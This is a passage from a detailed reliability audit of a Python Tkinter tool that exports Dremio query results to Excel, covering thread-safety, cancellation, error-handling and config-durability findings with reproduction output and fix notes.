**Implication for F-13 (the dead Stop button).** These two findings share one
fix. `cancel()` is exactly what a working Stop needs, and `read_chunk()` is the
loop it needs to poll from: replacing the single blocking `read_all()` with a
`read_chunk()` loop that checks a `threading.Event` between batches, and calls
`reader.cancel()` when the event is set, makes cancellation real *and* closes
this leak. The pyarrow API supports the feature the UI already advertises; the
app simply never reaches for it.

---

### Status: FIXED (Tier 5) — a determinism fix

`_read_stream` released the reader only when `cancelled` was set, so every error
path leaked, and `_test_connection`'s `read_all()` had no guard at all. Both now
release. The condition is `not exhausted` rather than `not cancelled` because
`from_batches()` runs inside the `try`: if that raises, there is nothing left to
release.

Smaller than it looks, for the reason the correction above records — the reader
is freed by refcounting, which is prompt, and `app.py` binds `str(e)` without
retaining `e`, so the shipped app fell on the lucky side. What the fix buys is
that release is now **deliberate** rather than contingent on refcount timing and
on no future error handler ever holding a traceback. "Correct by accident of
CPython's collector" is not a property to rely on.

Verified: `repro_f09_f10_resource_release.py`: **NOT REPRODUCIBLE** — 1 further
batch where a deliberately abandoned control reader takes 29.

### F-11 — Every failed export leaves a corrupt `.xlsx` at the target path · **High**

**Evidence: EXECUTED**

**File:** [app.py:755-773](../../dremio_Tool/app.py#L755-L773)

`pd.ExcelWriter.__exit__` calls `close()` → `save()` **unconditionally**. It does
not inspect the exception state, so any error raised inside the `with` block —
F-01, F-04, F-05, F-06 all qualify — still triggers a save of the half-built
workbook.

**Measured**, forcing the F-01 path:

```
raised ValueError: 'A[' is not a valid column name. Column names are from A to ZZZ
file exists afterwards: True  size=2290
openable by pandas: NO
zip members: ['docProps/app.xml', 'docProps/core.xml', 'xl/theme/theme1.xml']
```

The file is a **structurally valid zip containing only metadata** — no
`workbook.xml`, no worksheet, no data. Excel will report it as corrupt and offer
to repair it.

### Status: FIXED (Tier 2)

The write is wrapped in a `try` that calls `_discard_partial_export(filepath)`
and re-raises. Both artifact shapes are covered, since the fix is at the writer
rather than at any particular failure.

Deleting is safe: the writer opened the path in write mode, which truncated any
previous file *before* the failure, so the old contents were already gone —
removing the remnant loses nothing that still existed.

> The writer changed under this fix: F-08 replaced `pd.ExcelWriter` with a
> `write_only` workbook, so the remnant now arrives from `workbook.save()`
> failing part-way through the zip rather than from `ExcelWriter.__exit__`
> calling `save()` regardless of the exception state. The guard is unchanged and
> still wraps the whole write, which is why it covers the new failure point for
> free.

`_discard_partial_export` is best effort. It runs while an exception is
propagating, so a failure to unlink must not replace the real error with a
second one; it logs the path instead, leaving the user aware the file is not a
real export.

Verified: after a failed export, **no file is left at the target path**.
`repro_f11_corrupt_partial_file.py`: **NOT REPRODUCIBLE**.

**Reproduced by:** `dremio_Tool/tests/repro_f11_corrupt_partial_file.py`.
Re-measured in Stage 0 at 2,291 bytes with the same three members. Reading it
back now raises `OptionError: No such keys(s): 'io.excel.zip.reader'` rather
than a clean failure — the pandas 3.0 drift recorded in F-32.

> **Refinement (Tier 2) — there is a second, worse artifact shape.**
> **Evidence: EXECUTED.** The measurement above used F-01's trigger, which fails
> in the auto-fit loop *after* `to_excel` has run. Once F-01 was fixed the repro
> had to switch to F-05's trigger, which fails *inside* `to_excel` — and
> produces something quite different:
>
> | Failure point | Artifact |
> |---|---|
> | after `to_excel` (F-01, F-06) | 2,291-byte metadata-only zip, will not open |
> | inside `to_excel` (F-05) | **4,838-byte workbook that opens cleanly, correct column headers, 0 of 1 rows** |
>
> The second is more dangerous than the corrupt zip this finding describes.
> Nothing signals a problem: Excel opens it without complaint and shows the
> right headers over an empty sheet, so the natural reading is "the query
> returned no rows" rather than "the export failed". A user could report an
> empty result upstream on the strength of it.
>
> This does not change the fix — delete the file on the error path, which covers
> both shapes — but it does mean the finding cannot be verified by checking that
> the artifact is unopenable.

> **Mechanism note added in Stage 0**, because it decides what a test must do.
> The artifact's state depends on whether the exception object is still alive.
> While it is, its traceback pins the frame of `_export_to_excel`, which pins the
> abandoned `ExcelWriter`, so the zip central directory is never written and the
> file is a truncated **non**-zip. Once the handler ends and Python deletes the
> except-clause name, the writer is finalised and the file becomes the plausible
> metadata-only zip above. `_execute_thread` releases `e` the same way, so the
> finalised form is what the user actually finds — but a test that holds the
> exception will measure the other one and report a different size.

**How a user reaches it:** it lands at exactly the path the success dialog would
have named, with the user's own filename pattern. Because the name carries a
timestamp, it does not overwrite anything — it accumulates. A user who hits F-06
five times has five plausible-looking, non-openable exports in their output
folder alongside their real ones, with nothing but the byte size to tell them
apart.

---

## Thread safety

Tk cannot be exercised here (no `$DISPLAY`, no Xvfb), so the following was
established by an AST analysis executed over the real `app.py`: identify every
`self.*` attribute assigned from a Tk constructor, compute the set of methods
transitively reachable from a `threading.Thread(target=…)`, and report Tk
attribute touches in those methods that are **not** nested inside a
`self.root.after(...)` call.

### F-12 — Six Tk widget reads execute on worker threads · **Medium** *(was High)*

**Evidence: EXECUTED + STATIC** *(was STATIC)*

**Reproduced by:** `dremio_Tool/tests/repro_f12_offthread_widget_reads.py`

### Status: FIXED (Tier 3) — all 6 sites, plus the marshalling underneath them

> This block read **"PARTIALLY FIXED — 4 of 6 sites"** until item 26, describing
> the state after the first of three commits. Both remaining sites were fixed in
> item 11 and the cross-thread marshalling in item 14; the entry simply never
> caught up. Recorded rather than quietly overwritten, because a status block
> that lags its own fixes is its own kind of defect — anyone reading it would go
> hunting for work already done.

**The reads (items 4 and 11).** `_snapshot_export_settings()` reads `output_dir`,
`filename`, `autofit` and
`freeze_header` on the Tk thread; `_execute_and_export` takes the snapshot
before starting the worker and threads it through to `_export_to_excel`, exactly
as `_connect` already did for its own inputs.

`_export_to_excel` now **raises** if called with no snapshot from a non-main
thread, so the contract is enforced rather than documented — a future caller
cannot silently reintroduce this.

`use_tls` and `open_after` — the last two — were snapshotted in item 11, taking
`repro_f12`'s static scan from 6 sites to **0**.

**The marshalling (item 14), which was the larger half.** The reachable case was
the window being closed mid-query: the worker hung, the export was abandoned, and
nothing appeared on any channel. A shutdown flag was the obvious fix and it did
**not** work — measured, the worker was already blocked inside Tkinter's
`_register`, having entered Tcl before any flag could be read. `root.after` from
a foreign thread queues the call to the interpreter's thread and *blocks* until
it runs; close the window at that moment and nothing ever runs it.

So workers no longer enter Tcl at all. `_ui()` puts a callable on a plain
`queue`; `_drain_ui_queue`, on the Tk thread where touching Tcl is legal, runs it
and reschedules itself. All 27 cross-thread `root.after(0, ...)` sites go through
it. `_on_close` cancels a running query first — so the worker is not inside a
multi-second read when the interpreter goes — then sets the flag before
`destroy()`. Each queued callback is isolated, so one that raises cannot stop the
pump and take every later update with it, including the ones reporting the
failure.

Verified: `repro_f12_offthread_widget_reads.py`: **NOT REPRODUCIBLE** — no
unmarshalled reads remain in worker-reachable methods, and closing the window
mid-query no longer strands the worker (`alive_after=False`, against a worker
that previously outlived a 20 s join).

> The repro would have claimed success too early. Its early exit returned NOT
> REPRODUCIBLE as soon as the read count hit zero, skipping the runtime section
> entirely — so the half that was still broken went unmeasured. The runtime
> section now always runs and the verdict depends on it.

> **Severity revised High → Medium in Stage 0, and the rationale below is
> partly wrong.** The access pattern is real — all six sites re-derived from
> live source by AST. What does not survive measurement is *why* it was rated
> High.
>
> Tcl on this build reports `tcl_platform(threaded) = 1`. On a threaded build
> `_tkinter` does not let a foreign thread touch the interpreter at all: it
> packages the call and hands it to the interpreter's own thread via
> `Tcl_ThreadQueueEvent`, blocking until it completes. The read is **serialised,
> not racy**. Measured:
>
> | Regime | Condition | Result |
> |---|---|---|
> | A | mainloop running, Tk thread idle | **correct value returned** |
> | B | mainloop running, Tk thread busy | **worker blocks** until it is free |
> | C | mainloop stopped (window closed) | `RuntimeError`, deterministically |
>
> Against the three manifestations predicted below: the `RuntimeError` is real
> but only in regime C; **"silent wrong values" was not observed and should not
> be expected on a threaded build**; the interpreter-level crash occurs only if
> Tk is re-initialised after a thread was stranded in a destroyed interpreter,
> which the app never does. A fourth mode the finding did not list — regime B's
> blocking — is the one that dominates, and it is a liveness hazard, not a
> corruption one.
>
> **The claim that made it High does not hold.** The finding says it is reached
> on "every single connect and every single export". It is not: on this build
> those reads are marshalled and return correct values, which is why eighteen
> other repro scripts drove exactly this path without a single failure.
>
> **The reachable defect is narrower and different.** Closing the window while a
> query runs puts the worker into regime C, and the observed outcome is not a
> crash but a **hang**: the worker sat alive 20 seconds after teardown, blocked
> inside a Tk call whose interpreter no longer dispatches, with no file written
> and no error on any channel. It is a daemon thread, so the process exits and
> the user simply never gets their export. F-15 widens this window, because
> `root.update()` inside `_log` lets the close be dispatched at any log line.
>
> Medium fits: "wrong behaviour on a reachable-but-less-common path;
> recoverable" — re-running the query works.
>
> **Fix it anyway, and the fix does not change.** Snapshot the widget values on
> the main thread and pass them to the worker, exactly as `_connect` already
> does at [app.py:628-631](../../dremio_Tool/app.py#L628-L631). It is cheap,
> it removes the regime-C hang, and it removes the dependency on a threaded Tcl
> build. **Re-check `tcl_platform(threaded)` on the deployment platform** — if
> it is ever 0, the original High rationale applies in full.

Tkinter is not thread-safe; Tcl interpreter access from a non-owning thread is
undefined behaviour that manifests as `RuntimeError: main thread is not in main
loop`, silent wrong values, or an interpreter-level crash.

| Line | Method | Access | Widget type |
|---|---|---|---|
| [app.py:661](../../dremio_Tool/app.py#L661) | `_connect_thread` | `self.use_tls.get()` | `BooleanVar` |
| [app.py:726](../../dremio_Tool/app.py#L726) | `_execute_thread` | `self.open_after.get()` | `BooleanVar` |
| [app.py:748](../../dremio_Tool/app.py#L748) | `_export_to_excel` | `self.output_dir.get()` | `ttk.Entry` |
| [app.py:751](../../dremio_Tool/app.py#L751) | `_export_to_excel` | `self.filename.get()` | `ttk.Entry` |
| [app.py:761](../../dremio_Tool/app.py#L761) | `_export_to_excel` | `self.autofit.get()` | `BooleanVar` |
| [app.py:771](../../dremio_Tool/app.py#L771) | `_export_to_excel` | `self.freeze_header.get()` | `BooleanVar` |

`_export_to_excel` is called directly at [app.py:721](../../dremio_Tool/app.py#L721),
not marshalled, so its whole body runs on the worker.

To the code's credit, every *write* path is correctly marshalled — `_log`,
`_set_status`, and `_update_connection_status` are only ever invoked from inside
`root.after(0, …)` lambdas. The bug is confined to reads, which is exactly the
class a developer forgets because it "just returns a value".

**Primitive that should be used:** none — this needs a structural fix, not a
lock. **Snapshot every widget value on the main thread and pass it to the
worker as arguments**, the way `_connect` already does for hostname/port/
username/token at [app.py:628-631](../../dremio_Tool/app.py#L628-L631). The
same four lines should have captured `use_tls`. If a lock were used instead it
would not help: the problem is Tcl interpreter affinity, not a data race.

**How a user reaches it:** every single connect and every single export. It has
presumably not been noticed because CPython's GIL plus Tk's `WaitForMainLoop`
makes the failure intermittent rather than deterministic.

> **Stage 0 note — no dedicated script yet, but incidental evidence.** This
> finding was outside Stage 0's brief (it is STATIC, not SOURCE-only, and was
> not on the reconstruction list), so no script targets it. It did not go
> unexercised, though: the F-13, F-14 and F-16 reproductions all run
> `_export_to_excel` on a real worker thread, which reads `output_dir`,
> `filename`, `autofit` and `freeze_header` off-thread exactly as the table
> above describes. **Those reads did not crash in any run**, and the exports
> completed correctly.
>
> That does not disprove the finding — undefined behaviour is entitled to look
> like it works, and the audit itself predicts intermittency — but it does mean
> the failure is not readily reproducible by simply exercising the path once.
>
> **That script was subsequently written** — see the severity revision at the
> top of this finding, which supersedes this note.
>
> One hard fact the Stage 0 harness established about Tk threading: a non-Tk
> thread may call `root.after(...)` **only while the main thread is inside
> `mainloop()`**. Servicing the queue with `root.update()` instead is not
> equivalent, and makes `_execute_thread` die at its first progress callback
> with `RuntimeError: main thread is not in main loop`. That is a property of a
> naive test harness, not of the app — but it is the same machinery this finding
> is about.

---

### F-13 — `self.is_running` is a plain `bool` shared across threads · **Medium**

**Evidence: EXECUTED** *(was SOURCE)*

**Reproduced by:** `dremio_Tool/tests/repro_f13_stop_button.py`, driving the real
Execute handler and a real worker thread against a local Arrow Flight server
streaming 40 record batches with a deliberate delay between them:

```
Stop pressed after            6 of 40 record batches
server streamed               all 40 batches
rows retrieved                40,000 (the complete result set)
output file                   written anyway, 551,661 bytes
success dialog                shown - "40,000 rows exported."
log said                      "Execution cancelled"
```

An AST scan distinguishing loads from stores (a grep cannot tell
`self.is_running = False` from `if self.is_running:`) finds assignments at
app.py:70, 697, 739 and 778, and **no reads anywhere** — in `app.py` or outside
it.

**Files:** [app.py:697](../../dremio_Tool/app.py#L697) (main),
[app.py:739](../../dremio_Tool/app.py#L739) (worker),
[app.py:778](../../dremio_Tool/app.py#L778) (main)

Written by the main thread in `_execute_and_export` and `_stop_execution`, and
by the worker in its `finally`. No synchronisation.

Compounding this, **nothing ever reads it.** `INVENTORY.md` §5.3 records that
the Stop button does nothing; the audit confirms the flag has no reader in
`execute_query`, `_execute_thread`, or `_export_to_excel`. `_stop_execution`
logs "Execution cancelled" — an **affirmatively false statement to the user** —
while the query continues to completion and the file is still written.

**Primitive that should be used:** `threading.Event`. `set()`/`clear()`/
`is_set()` are atomic, and the worker can poll `is_set()` between Flight record
batches — replacing `read_all()` with a `read_chunk()` loop — and call
`reader.cancel()` when the event is set. Both members are confirmed present in
pyarrow 25.0.1 (see F-10), so nothing about the transport blocks a real Stop
button; it was simply never implemented. Fixing F-13 and F-10 is one change.

---

### Status: FIXED (Tier 4 decision — restructure the read)

The decision this finding asked for was taken: `execute_query` now reads the
stream **batch by batch** instead of in one blocking `read_all()`. Cancellation
works on two levels — a `threading.Event` checked between record batches, and
`cancel_query()` calling `FlightStreamReader.cancel()` on the live reader, so a
read already blocked waiting for the next batch is interrupted at once rather
than at the end of the stream.

Cross-thread `cancel()` was measured before being relied on: it unblocks the
reader in ~1 ms, raises `FlightCancelledError` cleanly, and does not destabilise
the process (pyarrow 25.0.1, threaded Tcl build).

A cancelled query keeps **nothing** — batches discarded, no DataFrame, no file,
and the run reported as cancelled rather than as success or as an error.

> **Scope, stated rather than assumed.** What is cancelled is the Flight result
> stream. Whether Dremio also kills the server-side job **cannot** be established
> against the local test server and is **not claimed**; the repro records how to
> settle it against a real endpoint via `sys.jobs`.

Verified: `repro_f13_stop_button.py`: **NOT REPRODUCIBLE** — 7 of 40 batches
delivered, worker exited 0.01 s after Stop against ~5 s of stream remaining.

### F-14 — `disconnect()` can null the client out from under a running query · **High**

**Evidence: EXECUTED** *(was SOURCE)*

**Reproduced by:** `dremio_Tool/tests/repro_f14_disconnect_race.py`. The local
Flight server's `get_flight_info` is given a 3-second delay, which holds the
worker inside [connection.py:331](../../dremio_Tool/connection.py#L331) while
the main thread clicks Disconnect. Observed:

```
execute_btn during execution   disabled
connect_btn during execution   normal      <- Disconnect is clickable
after _toggle_connection()     client=None, bearer_token=None, is_connected=False
worker outcome                 ERROR: 'NoneType' object has no attribute 'do_get'
```

Exactly the predicted `AttributeError`, at the predicted site.

**Scope of the reproduction:** this is a local `pyarrow` Flight server, not
Dremio. What it establishes is how *the app* behaves when a server is slow —
which is all this finding turns on — not anything about Dremio's own planning or
cancellation semantics.

> **Correction (Stage 0).** The claim that the failure is "surfaced to the user
> as a bare `AttributeError` dialog" is unreliable. Per **F-33**, the dialog is a
> lambda capturing the except-clause name, dispatched after the block ends.
> Measured over 5 trials of this failure shape: the dialog reached the user
> **1/5** times. The user usually sees only a log-panel line and a progress
> label reading "Error" — the export simply stops with no stated reason.

**Files:** [app.py:619-621](../../dremio_Tool/app.py#L619-L621),
[connection.py:296-303](../../dremio_Tool/connection.py#L296-L303),
[connection.py:331-339](../../dremio_Tool/connection.py#L331-L339)

The Connect/Disconnect button is **never disabled during query execution** —
`_execute_and_export` disables only `execute_btn`
([app.py:698](../../dremio_Tool/app.py#L698)). So while `_execute_thread` is
inside `execute_query`, the user can click Disconnect, which runs
`connection.disconnect()` on the main thread and sets `self.client = None`.

`execute_query` re-reads `self.client` at each step —
[connection.py:331](../../dremio_Tool/connection.py#L331) (`get_flight_info`)
and [connection.py:338](../../dremio_Tool/connection.py#L338) (`do_get`). A
disconnect landing between them produces:

```
AttributeError: 'NoneType' object has no attribute 'do_get'
```

surfaced to the user as a bare `AttributeError` dialog with no explanation.
`self.bearer_token` and `self.is_connected` are torn down in the same window.

**How a user reaches it:** start a slow query, decide to cancel, discover Stop
does nothing (F-13), click Disconnect instead. That is the *natural* recovery
sequence given F-13, which makes this materially more likely than it looks.

**Primitive that should be used:** a `threading.Lock` held across the read of
`self.client` and its use, or — simpler and matching the existing design —
disable `connect_btn` for the duration of execution, alongside a
`threading.Event` guard so `disconnect()` refuses to run while a query is in
flight.

---

### Status: FIXED (Tier 3)

The affordance stays — Disconnect is the user's escape hatch, and F-13 has now
given it a real cancellation path to use. Three parts:

- `execute_query` binds `client` and `bearer_token` to **locals once**, so a
  disconnect can end a call but cannot dismantle one already under way
- `disconnect()` cancels any in-flight read first, so the read ends deliberately
  rather than being orphaned
- the UI says what it will cost, then cancels through the same path as Stop

Worth recording *why* this was the likely path rather than an exotic one: the
recovery sequence for a slow query was to press Stop, find it did nothing
(F-13), and disconnect instead.

Verified: `repro_f14_disconnect_race.py`: **NOT REPRODUCIBLE**, driving both
windows — inside `get_flight_info` where no reader exists yet and the flag is
what catches it, and mid-stream where the reader is interrupted directly.

### F-15 — `root.update()` re-enters the event loop from inside callbacks · **Medium**

**Evidence: EXECUTED** *(was SOURCE)*

**Reproduced by:** `dremio_Tool/tests/repro_f15_update_reentrancy.py`. Both the
re-entrancy and its nastiest consequence were observed:

```
callback order          ['outer-start', 'queued-callback-ran', 'outer-end']
                        -> queued work ran INSIDE _log, before its caller finished

window closed mid-log   TclError: invalid command name
                        ".!frame2.!frame2.!labelframe2.!frame.!frame.!frame.!scrolledtext"
```

The second is the predicted failure verbatim: the outer callback resumed against
widgets `root.destroy()` had already torn down.

**Files:** [app.py:518](../../dremio_Tool/app.py#L518),
[app.py:606](../../dremio_Tool/app.py#L606)

```python
def _log(self, message):
    ...
    self.root.update()          # app.py:518
```

`update()` processes the *entire* pending event queue, including other queued
`after` callbacks and user input. `_log` is called from inside `after`
callbacks, so each log line re-enters the event loop while an outer callback is
still on the stack.

Consequences, in order of nastiness:

- The user can click **Connect/Disconnect** during a log write, re-entering
  `_toggle_connection` — directly feeding F-14.
- The user can close the window mid-log; `_on_close` runs `root.destroy()`, and
  the outer callback then resumes against destroyed widgets →
  `TclError: invalid command name ".!frame..."`.
- Queued `after` callbacks can run out of their intended order relative to the
  code that queued them.

**Primitive that should be used:** `update_idletasks()` if a redraw is genuinely
needed (it flushes rendering without dispatching user input or `after`
callbacks), or nothing at all — the `after`-based design already returns control
to the event loop naturally.

---

### Status: FIXED (Tier 3)

`update()` is gone from `app.py`. `update_idletasks` flushes the redraw and
dispatches nothing, which is all `_log` and `_set_status` ever needed.

> The static scan in this finding's own repro counted the new comment naming both
> methods as two extra call sites. It parses now instead of grepping — the same
> lesson as F-22's.

Verified: `repro_f15_update_reentrancy.py`: **NOT REPRODUCIBLE**.

## Error handling

### F-16 — On non-Windows, every successful export is reported as an error · **High**

**Evidence: EXECUTED** *(was EXECUTED + SOURCE)*

**Reproduced by:** `dremio_Tool/tests/repro_f16_startfile_false_error.py`, which
runs a real query and export against a local Flight server with "Open after
export" left at its default of on:

```
file written correctly    True - success.xlsx, 7,666 bytes, 200 rows
progress label            'Error'
SUCCESS dialog shown      False
log                       "Done! Exported to success.xlsx"
                          "ERROR: module 'os' has no attribute 'startfile'"
```

The consequence half is no longer reasoned: the export demonstrably completed
and the success dialog was demonstrably never reached.

> **Correction (Stage 0), and it makes this worse.** The finding says the user
> is shown an error dialog. In the reproduction **no dialog appeared at all** —
> the `showerror` call is lost to **F-33**. So a completed, correct export
> presents as: no success dialog, no error dialog, and a small progress label
> reading "Error". In a windowed PyInstaller build there is no stderr either, so
> the user has almost nothing to go on.

**File:** [app.py:726-727](../../dremio_Tool/app.py#L726-L727)

```python
if self.open_after.get():
    os.startfile(filepath)
```

Verified on this platform: `hasattr(os, 'startfile')` is `False`;
calling it raises `AttributeError: module 'os' has no attribute 'startfile'`.

This call sits **inside** the `try` at [app.py:708](../../dremio_Tool/app.py#L708),
*after* the export has fully succeeded, and *before* the success messagebox at
[app.py:729](../../dremio_Tool/app.py#L729). So on Linux/macOS the control flow is:

1. query runs, file is written correctly ✅
2. `os.startfile` raises `AttributeError`
3. jump to `except` → log `ERROR: module 'os' has no attribute 'startfile'`,
   set the progress label to "Error", show an error dialog
4. the success dialog is **never reached**

The user is told the export failed. It did not. Their file is sitting in the
output folder.

### Status: FIXED (Tier 2)

Two changes, and the second is the one that matters. `_open_exported_file`
guards on `hasattr(os, 'startfile')` and logs a note when the platform cannot
oblige — but it is also called **outside** the `try`, after the success dialog
has already been shown. The export is complete and reported by that point, so
nothing that happens while opening the file can be presented as an export
failure. Any other exception from `os.startfile` is caught and logged as a note
too.

Verified: 200 rows written, progress label reads "Done! Exported to
success.xlsx", success dialog shown, no error dialog, and the log carries
"Note: 'Open after export' is supported on Windows only. The file was written
but not opened." `repro_f16_startfile_false_error.py`: **NOT REPRODUCIBLE**.

**How a user reaches it:** every export on any non-Windows machine, because
"Open after export" is checked by default
([app.py:297](../../dremio_Tool/app.py#L297)). `INVENTORY.md` §5.2 flags
`os.startfile` as Windows-only; what the audit adds is that the *placement*
inside the try block converts a cosmetic platform gap into a false failure
report.

---

### F-17 — `_open_output_folder` raises into the Tk callback with no handler · **Medium**

**Evidence: EXECUTED** *(was SOURCE)*

**Reproduced by:** `dremio_Tool/tests/repro_f17_open_folder_silent.py`. The
button is invoked through Tcl (`.invoke()`) rather than by calling the bound
method, because the finding is precisely about what Tk's callback machinery does
with the exception:

```
exception escaped to the caller   no
caught by Tk                      AttributeError: module 'os' has no attribute 'startfile'
log lines added by the click      NONE
dialog shown                      none - there is no handler to show one
try/except in _open_output_folder NONE
```

Confirmed: the button silently does nothing.

**File:** [app.py:568-574](../../dremio_Tool/app.py#L568-L574)

The same `os.startfile` call, this time on the main thread inside a button
callback with **no `try`**. Tk catches exceptions from callbacks, prints a
traceback to `stderr`, and continues. The button therefore appears to do
nothing.

In the documented PyInstaller windowed build (`README.md:215`) there is no
`stderr`, so the failure is **completely silent** — no dialog, no log line, no
console output.

---

### Status: FIXED (Tier 5)

Guarded three ways: a `hasattr(os, 'startfile')` check with an explanatory
dialog, a `try/except` around the call, and a log line on every path. The
callback no longer escapes to Tk's exception reporter, which printed a traceback
to a stderr a windowed build does not have and left the button looking dead.

Verified: `repro_f17_open_folder_silent.py`: **NOT REPRODUCIBLE** — the user is
told on both channels.

> The repro's hardcoded line-range source check was replaced with an AST lookup;
> the ranges from the original audit went stale as soon as anything above the
> method moved.

### F-18 — Unguarded file I/O in three UI callbacks · **Medium**

**Evidence: STATIC + SOURCE**

| Line | Method | Failure |
|---|---|---|
| [app.py:531](../../dremio_Tool/app.py#L531) | `_save_log` | `PermissionError`/`OSError` on a read-only or full target |
| [app.py:545](../../dremio_Tool/app.py#L545) | `_load_query_file` | `UnicodeDecodeError` — opened with no `encoding=`, so a UTF-16 or cp1252 `.sql` file fails |
| [app.py:557](../../dremio_Tool/app.py#L557) | `_save_query_file` | as `_save_log` |

All three use `with`, so **handles are correctly closed** — the defect is purely
the absence of a handler. Each propagates into the Tk callback and dies the same
silent way as F-17. Note the inconsistency: `config.py` opens its query files
with `encoding='utf-8'` ([config.py:440](../../dremio_Tool/config.py#L440),
[config.py:455](../../dremio_Tool/config.py#L455)); `app.py`, which is the code
actually reachable from the UI, does not.

---

### Status: FIXED (Tier 5)

All three callbacks report on both channels and return rather than propagating
into Tk. Encodings are explicit, for the reason `config.py` already made them
explicit: the platform default is not the same thing everywhere, and this app
wrote its own files one way and read them another.

The load path is the sharper half — nothing has to go wrong for it to fail.
`open(filepath, 'r')` takes the platform default, so an ordinary Load of an
ordinary `.sql` file raised `UnicodeDecodeError`: SSMS writes UTF-16 by default
and older tools write cp1252. Measured against the unfixed build, **1 of 4**
realistic encodings loaded.

> **A near-miss worth recording, because the repro caught it and review would
> not have.** The first version of the fix listed `utf-16` in a try-in-order
> list. Without a BOM, decoding as UTF-16 assumes little-endian and turns *any*
> even-length byte sequence into plausible nonsense instead of raising — so the
> cp1252 file and a binary file both came back as garbage rather than falling
> through. **An encoding that never fails cannot be an item in a fallback list;
> it ends the list.** The BOM is decisive now, and the no-BOM path tries utf-8
> then cp1252 only. No latin-1: mojibake in a SQL statement is worse than a
> refusal, because it runs.

Verified: `repro_f18_unguarded_file_io.py`: **NOT REPRODUCIBLE** — all 4
encodings load, and failures are forced with real conditions (a directory where
a file should be, a `chmod 0400` target) rather than patched exceptions.

### F-19 — Buttons latch permanently if `Thread.start()` fails · **Low**

**Evidence: EXECUTED** *(was SOURCE)*

**Reproduced by:** `dremio_Tool/tests/repro_f19_button_latch.py`, patching
`Thread.start` to raise rather than actually exhausting the thread table:

```
Connect   connect_btn  normal/'Connect'  ->  disabled/'Connecting...'   LATCHED
Execute   execute_btn  disabled, stop_btn normal, is_running still True LATCHED
```

In both cases the `RuntimeError` escapes the handler entirely, and no `try`
exists around either `thread.start()`.

**Files:** [app.py:640-649](../../dremio_Tool/app.py#L640-L649),
[app.py:697-704](../../dremio_Tool/app.py#L697-L704)

Both handlers disable buttons *before* starting the thread, and the `start()`
call is outside any `try`. If it raises `RuntimeError: can't start new thread`,
`connect_btn` stays disabled reading "Connecting…" forever, or `execute_btn`
stays disabled with `stop_btn` lit — the UI is stuck with no recovery short of
restarting the app. Requires thread exhaustion, hence Low.

The general shape is worth noting: **the state reset lives only in the worker's
`finally`, so any failure before the worker starts leaves the UI latched.**

---

### Status: FIXED (Tier 5)

State transitions are `_set_connecting_state` / `_set_executing_state`, and
`_start_worker` calls the matching reset when `start()` fails — so the recovery
path exists whether or not a worker was ever created. The worker's `finally`
calls the same helper rather than poking widgets directly.

This also moved `is_running = False` off the worker thread and onto the Tk
thread, so only one thread writes it.

Verified: `repro_f19_button_latch.py`: **NOT REPRODUCIBLE** — with
`Thread.start()` patched to raise, every button returns to its resting state and
the exception no longer escapes the handler.

### F-20 — `print()` is the only error channel for the whole persistence layer · **Medium**

**Evidence: STATIC + SOURCE**

17 `print()` calls across the codebase; the 6 in `config.py` are the ones that
matter, because they are the sole report for silent config loss (F-22) and
credential failures:

| Line | Reports |
|---|---|
| [config.py:161](../../dremio_Tool/config.py#L161) | config/history failed to parse — **the only signal that settings were just reset** |
| [config.py:177](../../dremio_Tool/config.py#L177) | config failed to save |
| [config.py:313](../../dremio_Tool/config.py#L313) | keyring read failure, in the credential path |
| [config.py:337](../../dremio_Tool/config.py#L337) | keyring write failure, in the credential path |
| [config.py:375](../../dremio_Tool/config.py#L375) | `.credentials` read failure |
| [config.py:393](../../dremio_Tool/config.py#L393) | `.credentials` write failure |

`config.py:313` and `config.py:337` fire on **every single token operation in
this environment** — keyring resolves to `keyring.backends.fail.Keyring`, so the
import guard at `config.py:41-45` succeeds (`KEYRING_AVAILABLE = True`) and
every subsequent call then raises `NoKeyringError`,
which the broad handlers swallow before falling through to base64 file storage.
That fallback works correctly; the problem is that the app prints
`Keyring error: …` on a channel nobody reads, twice per session, and the user is
never told their token went to a plaintext-equivalent file instead of the OS
credential store.

The app has a perfectly good `_log()` panel in the UI. `config.py` cannot reach
it because it has no reference to the app — a callback parameter, like the
`on_status` one `connection.py` already uses, is the pattern the codebase
already established and did not apply here.

There are **no bare `except:`** clauses anywhere — verified by grep. The 11
`except Exception` handlers are broad but all bind and report.

---

### Status: FIXED (Tier 5)

`ConfigManager` gained `on_warning`, which `DremioExporter` installs once the log
panel exists; warnings raised before that still queue in `load_warnings` as they
did. `save_config` and `save_history` return success so callers can react.

> **The weakref in that installation is not decoration.** A closure over `self`
> completes the cycle `app -> config -> callback -> app`, and a cycle is freed by
> the cyclic GC rather than by refcount — which can run on any thread, finalise
> this app's Tk variables off the Tk thread, and abort the process with
> `Tcl_AsyncDelete: async handler deleted by the wrong thread`. Observed, not
> theorised: it killed `repro_f25` and `repro_f33` outright before the weakref
> went in.

Verified as part of `repro_f22_torn_write.py`: **NOT REPRODUCIBLE** — a failed
save now reaches someone. There is no separate `repro_f20`; the two findings
share a fix and a test.

## Config durability

### F-21 — Malformed-but-parseable JSON prevents the app from starting at all · **High**

**Evidence: EXECUTED**

**File:** [config.py:145-163](../../dremio_Tool/config.py#L145-L163)

`_load_json` catches only `json.JSONDecodeError` and `IOError` — i.e. only files
that fail to *parse*. Nothing validates the *shape* of what parsed. Every
consumer then assumes dict-of-dicts (config) or list-of-dicts (history).

Executed against a real `ConfigManager` with each corruption in place:

**`config.json`**

| Contents | Result |
|---|---|
| `{"connection": {"host` (truncated) | survived → silently reset to defaults |
| `` (empty file) | survived → silently reset to defaults |
| `[]` | **`TypeError: list indices must be integers or slices, not str`** |
| `null` | **`TypeError: argument of type 'NoneType' is not iterable`** |
| `42` | **`TypeError: argument of type 'int' is not iterable`** |
| `{"connection": "oops"}` | **`TypeError: 'str' object does not support item assignment`** |
| `{"connection": ["a"]}` | **`TypeError: list indices must be integers or slices, not str`** |

**`query_history.json`**

| Contents | Result |
|---|---|
| `[{"query":` (truncated) | survived → history silently emptied |
| `{}` | survived |
| `{"a": 1}` | **`AttributeError: 'str' object has no attribute 'get'`** |
| `["SELECT 1"]` (plausible v1 format) | **`AttributeError: 'str' object has no attribute 'get'`** |
| `[null]` | **`AttributeError: 'NoneType' object has no attribute 'get'`** |
| `null` | **`TypeError: 'NoneType' object is not iterable`** |
| `42` | **`TypeError: 'int' object is not iterable`** |

**Reproduced by:** `dremio_Tool/tests/repro_f21_malformed_json.py`, which runs
each corruption against a real `ConfigManager` in a fresh isolated `$HOME` and
drives the exact call sequence `DremioExporter.__init__` performs. Stage 0
re-confirmed all 14 rows: **10 of 14 are fatal** (5 config, 5 history), 4 survive
by silently resetting.

